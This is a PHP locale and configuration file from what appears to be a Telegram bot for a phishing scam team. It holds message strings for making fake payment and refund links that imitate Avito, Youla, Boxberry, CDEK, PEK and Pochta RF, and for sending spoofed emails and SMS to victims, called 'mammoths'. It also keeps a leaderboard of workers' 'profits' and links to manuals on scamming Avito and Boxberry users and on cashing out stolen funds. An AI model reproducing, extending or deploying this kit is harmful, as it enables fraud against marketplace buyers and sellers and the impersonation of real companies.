<?php
require $_SERVER['DOCUMENT_ROOT'] . '/bot/config.php';

$locale = [
    'startblock' => "<b>Для продолжения работы вам надо задать себе username в Telegram</b>",
    'itsok' => " успешно добавлен!",
    'fakenick' => "\n\n<b>🦹Фейк имя: </b> ",
    'adressbtc' => "Ваш адрес кошелька : ",
    'sms'=>"Вы сможете отправить смс через ",
    'minut' =>" минут",
    'youlink' => "Ваша ссылка оплаты ",
    'youlinkvozvrat' => "<b>Ваша ссылка</b> ",
    'tovatok'=> "Ваш товар готов к отправке. ",
    'smsok' => "<b> SMS успешно отправлено!</b>  лог:",
    'error'=> "<b>💷 Непредвиденная ошибка, попробуйте немного позже</b>",
    'log'=> ' лог:',
    'vozvratok'=> "Одобрение возврата. ",
    'avito2' => "Ваш товар оплачен. Получите средства ",
    'subjmailavito' => 'Заказ - AVITO оплата № ',
    'namemailavito'=> 'AVITO',
    'subjmailyoula' => 'YOULA оплата заказа № ',
    'namemailyoula'=> 'YOULA',
    'subjmailboxberry' => 'Заказ BOXBERRY № ',
    'namemailboxberry'=> 'BOXBERRY',
    'subjmailcdek' => 'CDEK оплата заказа № ',
    'namemailcdek'=> 'CDEK',
    'subjmailpek' => 'ПЭК оплата заказа № ',
    'namemailpek'=> 'ПЭК',
    'subjmailpochtarf' => 'ПОЧТА РФ оплата заказа № ',
    'namemailpochtarf'=> 'ПОЧТА РФ',
    'subjmailavitovozvrat' => 'Возврат средств заказа № ',
    'subjmailyoulavozvrat' => 'YOULA возврат заказа № ',
    'subjmailboxberryvozvrat' => 'BOXBERRY возврат заказа № ',
    'subjmailcdekvozvrat' => 'Возвтрат CDEK заказа № ',
    'subjmailpekvozvrat' => 'Возврат ПЭК заказа № ',
    'subjmailpochtarfvozvrat' => 'Возврат ПОЧТА РФ заказа № ',
    'subjmailavito2' => 'AVITO получение средств № ',
    'subjmailyoula2' => 'YOULA получение средств № ',
    'nolink' => "<b>💷 Отсутствует запрошенный тип ссылки</b>",
    'avitonebachu' => "<b>⚠️ Ты сделал что-то не так⚠️</b>\n\nВставьте сюда обьявление в формате https://avito.ru/item",
    'titletovar' => "<b>📝 Введи название товара</b>\n\nНазвание видит мамонт",
    'addres2' => "<b>💶 Адрес доставки</b>\n\n Для функции развода продавцов",
    'name2' =>"<b>💶 Укажи имя продавца</b>\n\n ",
    'fio2' =>"<b>💶 Укажи фамилию продавца</b>\n\n",
    'otchestvo' =>"<b>💶 Укажи отчество продавца</b>\n\n",
    'price' => "<b>💶 Укажи стоимость товара</b>\n\nВведи сумму товара которую оплатит мамонт",
    'noprice' => "<b>⚠️ Ты сделал что-то не так⚠️</b>\n\nВведи сумму целым числом - <b>Например 7400</b>",
    'timedostavki' => "<b>⏰ Укажи время доставки </b>\n\nК примеру 3-5 часа, или 2 дня",
    'pricedost' =>"<b>🏧 Введите сумму доставки </b>",
    'paymentsystems' => "<b>🏧 Выбери Платежку Для Оплаты </b>",
    'youlanebachu' =>"<b>⚠️ Ты сделал что-то не так⚠️</b>\n\nВставьте сюда обьявление в формате https://youla.ru/item",
    "parseyoula" => "<b>🌀 Получаем INFO о товаре</b>\n\nНужно немного подождать, но это быстрее чем вы думаете :3",
    'noparseyoula' => "<b>⚠️ Не могу спарсить INFO⚠️</b>\n\nПерепроверьте ссылку и попробуйте снова",
    'infoyoula' => "<b>✅ INFO ПОЛУЧЕН УСПЕШНО\n\n🎁 Товар: </b>",
    'priceyoula'=>"<b>\n💷 Стоимость: </b>",
    'valuta' => " <b>₽</b>",
    'resultitem' =>"<b>❇️ Ссылка успешно добавлена\n\n🎁 Товар: </b>",
    'payment' => " <b>₽</b>\n<b>🏧 Платёжка: </b>",
    'linkoplata' =>"\n\n🅰️️ Ссылка на оплату: ",
    'linkvozvrat' =>"\n🅱️ Ссылка на возврат: ",
    'linkv2' =>"\n🅾️️ Ссылка на 2.0: ",
    'oplatavozvrat' =>"\r\n\r\n🅰️️ Ссылка на оплату/возврат: ",
    'inforenew' => "✅ Информация успешно обновлена",
    'license' => "! \n\n <b>\xF0\x9F\x9A\xAB Перед началом, ознакомься с нашими правилами!</b>
  1. Запрещено медиа с некорректным содержанием (порно, насилие, убиуства, призывы к экстримизму, реклама наркотиков).
  2. Спам , флуд, пересылки других каналов, ссылки на стронние ресурсы.
  3. Запрещено узнавать у друг друга персональную информацию.
  4. Запрещено оскорблять администрацию.
  5. Запрещено попрошайничество в бесебе воркеров.
  6. Администрация не несет ответственности за блокировку ваших кошельков/карт.\n\n <b>\xF0\x9F\x9A\xA7 Вы подтверждаете, что ознакомились и согласны с условиями нашего проекта?</b>",
    'licenseok' => "Я согласен!",
    'licenseno' => 'Я отказываюсь!',
    'nomessage' => "📌\n\n Сообщение не может быть пустым...\xE2\x9D\x93",
    'questionnull' => "<b>\n\n✅1️⃣ От куда о нас узнал?</b> ",
    'questionone' => "<b>\n✅2️⃣ Есть ли опыт работы?</b> ",
    'questiontwo' => "<b>\n✅3️⃣ Сколько своего времени готов уделять?</b> ",
    'questiontree' => "<b>Ответь на пару вопросов и жди одобрения</b>\n\n"."✅1️⃣ <b>От куда о нас узнал</b> ?",
    'zayankaok'=>"<b>📌\n\nВаша заявка готова к отправке! Проверьте данные перед отправкой:</b>",
    'confirmsoglash' => "📌\n\n Пока все ожидайте:)",
   'fiootpr' => "<b>ФИО отправителя</b>",
    'ves'=> "<b>Введите вес товара </b>",
    'opisanie' => "<b>Введите описание товара </b>",
    'cityto' => "<b>Введите город назначения </b>",
    'cityfrom' => "<b>Введите город отправки </b>",
    'adrespolush'=>"<b>Введите адрес получателя </b>",
    'phonepoluch' => "<b>Введите номер получателя </b>",
    'dateotpr' => "<b>Введите дату отправки </b>",
    'datepoluch' =>"<b>Введите дату получения </b>",
    'fiopoluch' =>"<b>ФИО Получателя</b>",
    'listfish' => "<b>📟Выберите площадку📟</b>",
    'pages1' => "<b>🍀Созданные ссылки</b>\r\n\r\nВы на странице 1/",
    'stat' => "<b>🌚 Профиль</b> @",
    'rang' => "<b>\r\n\r\n🗽 Ранг в топе: </b>",
    'countlinks' => "<b>\r\n\n🗄 Объявлений: </b>",
    'zaletov' => "<b>\r\n\n💎 Всего профитов: </b>",
    'pribil'=>"<b>\r\n\n💸 Сумма профитов: </b>",
    'procent' => " <b>₽</b>\r\n\n⚖ Ставка: <b>$viplaty% | $vozvrat%</b> возврат",
    'aliance' => "<b>🗽 Топ воркеров</b>\r\n\r\n",
    'alianceposition'=> "<b>\r\n\r\nВаша позиция в топе:</b> ",
    'noprofit'=>"Ты еще не сделал ни одного профита👎",
    'manual'=> "<b>📚 Мануалы: 📚</b>\r\n
<a href=\"https://telegra.ph/Trek-otslezhivaemyj-na-off-sajte-05-28\">📘 Трек номер отслеживаемый на офф сайт</a>
<a href=\"https://telegra.ph/Manual-po-Avito-20-05-188\">❤️ Мануал по Avito 2.0</a>
<a href=\"https://telegra.ph/Manual-po-vyvodu-c-BTC-BANKERa-03-17-2\">💳 Мануал по выводу с BTC banker</a>
<a href=\"https://telegra.ph/Manual-po-skamu-na-avito-ot-Stratton-Oakmont-03-24\">📦 Мануал по скаму на Авито</a>
<a href=\"https://telegra.ph/Gajd-po-anonimnosti-03-24\">🌚 Гайд по анонимности</a>
<a href=\"https://telegra.ph/Rabota-so-Sphere-Browser-03-30\">👻 Мануал по Sphere (браузер)</a>
<a href=\"https://telegra.ph/CHto-luchshe-vystavlyat-naе-prodazhu-02-06\">⭐️ Что лучше выставлять на продажу?</a>
<a href=\"https://telegra.ph/Manual-po-skamu-na-Boxberry-03-30\">🔹 Мануал по скаму на Boxberry</a>
<a href=\"https://telegra.ph/Bezopasnost-s-telefona-03-30\">📱 Инструкция по безопасности с телефона</a>\r\n\r\n<b>💸 Процентные ставки: 💸</b>\r\n🔥 Оплата: <b>$viplaty%</b>\r\n🔥 Возврат: <b>$vozvrat%</b>\r\n
<b>🧲 Полезные ссылки: 🧲</b>\n
<a href=\"https://$domain_avito/pages/avito-delivery.php\">🖼 Фейк скрины от техподдержки</a>
<a href=\"$zalet_links\">🤑 Канал залетов</a>
<a href=\"$worker_links\">👥 Чат воркеров</a>
<a href=\"$tovarka_links\">💻 Канал с товаркой</a>",
    'helloresult' => "Приветствие $team записано!",
    'accessdanied' => "Не хватает прав!",
    'moderation' => "📌\nВаше сообщение отправлено на модерацию, вы получите уведомление о результатах проверки...",
    'inviteworcer' => " принят в команду $team",
    'info'=>" \n\nВы приняты, вступите обязательно в группу: $worker_links и канал залетов: $zalet_links",
    'noadmin' =>"\n\n Ты пока что не дорос до админа!",
    'nahui'=>"\n\nИдет нахуй!",
    'otkaz'=>" \n\nАдминистрация отказывает вам в посещении!",
    'memory'=>"В команде запомнили тебя!",
    'addavito'=>"<b>📌 Создайте  ссылку и получите ссылку На фейк </b>\n\nВставьте сюда обьявление в формате https://avito.ru/item",
    'addlink' => 'Создание ссылки ',
    'avito' =>' Авито!',
    'timedost' => " <b>₽</b>\n⏰ <b>Время доставки: </b>",
    'createlink'=>"<b>📌 Создайте  ссылку и получите ссылки на фейк</b>\n\nВставьте сюда обьявление в формате https://youla.ru/item",
    'createadres'=>"<b>🏧 Введи адрес покупателя </b> адрес на который мамонт отправить свой товар",
    'createnametovar'=>"<b>📝 Введи название Товара</b>\n\nНазвание увидит мамонт при оплате",
    'linkotmena' => 'Вы отменили создание ссылки!',
    'linkotmenatext'=>"<b>📛 Создание ссылки было  отменено</b>",
    'addlinkbox'=>'Создание ссылки BOXBERRY!',
    'addlinkcdek'=>'Создание ссылки CDEK!',
    'addlinkpek'=>'Создание ссылки PEK!',
    'addlinkpochtarf'=>'Создание ссылки ПОЧТА РФ!',
    'shemi'=>"<b>🍀 Созданные ссылки</b>\r\n\r\nВы на странице: ",
    'page'=>'Страница ',
    'email'=>"<b>✉️ Отправка EMAIL на ОПЛАТУ  ✉️ </b>\n\n🏷 EMAIL о том, что, посылка готова к отправке и ожидает подтверждения с вашей ссылкой на трек страницу.<b>\n\n1️⃣ Введите почту мамонта...</b>",
    'email2'=>"<b>✉️ Отправка EMAIL на ОПЛАТУ  ✉️ </b>\n\n🏷 EMAIL о том, что, товар оплачен и денежки ждут пока их заберут.<b>\n\n1️⃣ Введите почту мамонта...</b>",
    'emailvozvrat'=>"<b>✉️ Отправка EMAIL на ВОЗВРАТ  ✉️ </b>\r\n🏷 EMAIL о том, что, посылка готова к отправке и ожидает подтверждения с вашей ссылкой на трек страницу.<b>\n\n1️⃣ Введите почту мамонта...</b>",
    'smsopl'=>"<b>✉️ Отправка SMS на ОПЛАТУ  ✉️ </b>\n\n🏷 EMAIL о том, что, посылка готова к отправке и ожидает подтверждения.<b>\n\n1️⃣ Введите номер мамонта в формате 71234567890...</b>",
    'smsvozvrat'=>"<b>✉️ Отправка SMS на ВОЗВРАТ  ✉️ </b>\r\n🏷 SMS о том, что, посылка готова к отправке и ожидает подтверждения.у.<b>\n\n1️⃣ Введите номер мамонта в формате 71234567890... </b>",
    'sms2'=>"<b>✉️ Отправка SMS на об оплате вами товара мамонта  ✉️ </b>\r\n🏷 SMS о том, что, вы оплатили товар.у.<b>\n\n1️⃣ Введите номер мамонта в формате 71234567890...</b>",
    'dellink'=>"<b>✅ Ссылка успешно удалена</b>",
    'viewdellink'=>'Ссылка успешно удалена!',
    'viewgetcard'=>'Администратор ждет!',
    'getcardtext'=>"<b>⚠️Напиши в  ЛС администратору $admin_tg</b>",
    'hello'=>"<b>Приветствую тебя</b>",
    'hello2'=>"!<b>\n\nДобро Пожаловать в нашу команду $team</b>",
    'hello3'=>"<b>С Возвращением</b> @",
    'q'=>"!<b>\n\nПочему я не наблюдаю тебя в топе? 🤔</b>",
    'redaktor'=>"<b>✏️Редактор ссылки✏️</b>\r\n\r\n🦠  Площадка : ",
    'tovar'=>"<b>\r\n🧢 Название: </b>",
    'cena'=>"<b>\n💸 Цена: </b>",
    'pisimoopl'=>"<b>\r\n\r\n📧 Письмо оплаты:</b> ",
    'pisimovozvr'=>"<b>\n📧 Письмо возврата:</b> ",
    'smsopl1'=>"\n<b>📧 SMS оплата:</b> ",
    'smsvozvr1'=>"\n<b>📧 SMS возврат:</b> ",
    'smstime'=>"\n<b>⌛️ Время до смс:</b> ",
    'activepaymentsystem' => 'Платежная система успешно выбрана!',
    'help'=>"/setcard [номер карты без пробелов] - установка карты \r\n /configs - редактор конфига и выбор платежек \r\n /say - сообщение в группу воркеров \r\n /cardlist - редактор карт \r\n /top - вывод топа воркеров \r\n /btc - вывод курса биткоина \r\n /getsmsbalance - чек баланса смс \r\n /getcard - посмотреть текущую карту \r\n /setadmin - установить админа \r\n /ban id - забанить \r\n /getgroupid - узнать id чата",
'insertnick' => "<b>Введите ник для отображения</b>",
    'newnametovar' =>"<b>📝 Введи новое название товара</b>",
    'newprice'=>"<b>💷 Введи новую стоимость товара</b>",
    'newpaymentsystem'=>"Выберите платежную систему",
'configlist'=>"Список конфигов",
    'cardlist'=>"Список карт",
'setnickname'=>"Задать фейк имя",
    'end'=>"Завершить",
    'editname'=>"📝 Изменить название товара",
    'beck'=>"⬅️ Назад",
'worcer' =>"📌\n\nВоркер @",
    'prislal'=>" прислал анкету:",
    'azaza'=>"\xF0\x9F\x98\x8E Нельзя @",
    'errorlinks'=>" !\xE2\x98\x9D \xF0\x9F\x94\x97 Ссылки запрещены администратором!\xE2\x98\x9D",
    'errorvideo'=>" !\xE2\x98\x9D \xF0\x9F\x94\x97 Ссылки запрещены администратором!\xE2\x98\x9D",
    'image'=>"<b>Укажите ссылку на изображение вашего товара</b>\n  Вы можете воспользоваться ботом для загрузки изображения со своего устройства и получения ссылки на него, бот: <b>@imgurbot_bot</b>",
    'success'=>"<b>💷Успешно отправлено </b>",
    'errorsend'=>"<b>💷 Ошибка отправки</b>",
    'endcreate'=>"Завершить создание",
    'linkslist1'=>'🎁 ',
    'linkslist2'=>'💵 ',
    'linkslist3'=>'⚽️',
    'linkslist4'=>'🏐',
    'linkslist5'=>'🏀',
    'linkslist6'=>'🥎',
    'linkslist7'=>'🏈',
    'linkslist8'=>'🎱',
    'newroad'=>"<b>Введите новое значение\n (Должно начинаться с /):</b>  ",
    'editname2' =>"🖍 Изменить имя",
    'editprice2' =>"🖍 Изменить цену",
    'dellink2' =>"✂️ Удалить ссылку",
];
//Стикеры
$stickers = [
   0=> 'CAACAgIAAxkBAAIhA17QBPRaiO-pvvJ0BaQrrmwxs2dzAAIfAANOXNIp6r4LopZKW-4ZBA', //Приняли воркера
   1=> 'CAACAgIAAxkBAAIhAl7QBMPTx9LZPXFaQU9HmFQIXd7LAAIdAANOXNIpiNUsv6igYSAZBA', //Если нет прав админа
   2=> 'AgACAgIAAx0CV6W3tQADrl59BI4FwzyZID8rbtgkOykE8wKbAAJ7rTEb3svoS8r5ukKkGt09kgbBDgAEAQADAgADbQADtmkEAAEYBA', //Не юзается
   3=> 'CAACAgIAAxkBAAIhBl7QBrOemsEp1vgbziK2brtpIKWhAAIjAANOXNIpDSA8un89dL0ZBA', //При входе нового воркера в группу
   4=>'CAACAgIAAxkBAAIhC17QByXXkeaFb9zLg3WRp0wmebejAAIYAANOXNIpPmrdHrWuidkZBA', //Отклонил соглашение
   5=>'CAACAgIAAxkBAAIhBF7QBYXNqwhqjJS8J_ZhaFfHsb2TAAIiAANOXNIpYXS-_nMW_BQZBA' //Принял соглашение
];
$areas = [
    'avito' =>[
        'domain'=>$domain_avito,
        'title'=>"⚽️АВИТО",
        'cmd'=>'createLink',
        'position' =>0
        ],
    'youla' =>[
        'domain'=>$domain_youla,
        'title'=>"🏐 ЮЛА",
        'cmd'=>'createLinkYoula',
        'position' =>1
    ],
    'boxberry' =>[
        'domain'=>$domain_boxberry,
        'title'=>"🏀 БОКСБЕРИ",
        'cmd'=>'setBoxberryAccount',
        'position' =>2
    ],
    'pek' =>[
        'domain'=>$domain_cdek,
        'title'=>"🏈 ПЭК",
        'cmd'=>'setPecAccount',
        'position' =>1
    ],
    'cdek' =>[
        'domain'=>$domain_pek,
        'title'=>"🥎 СДЭК",
        'cmd'=>'setCdekAccount',
        'position' =>2
    ],
    'pochtarf' =>[
        'domain'=>$domain_pochtarf,
        'title'=>"🎱 ПОЧТА РФ",
        'cmd'=>'setPochtarfAccount',
        'position' =>0
    ],
];
$keyboard['main']  = [
    ["💲 Создать ссылку 💲", "📌 Мои ссылки 📌"],
    ["🤑 Мой профиль 🤑", "🥇 ТОП 🥇"],
    ["🧠 Помощь 🧠", "⚙ Настройки ⚙"]
] ;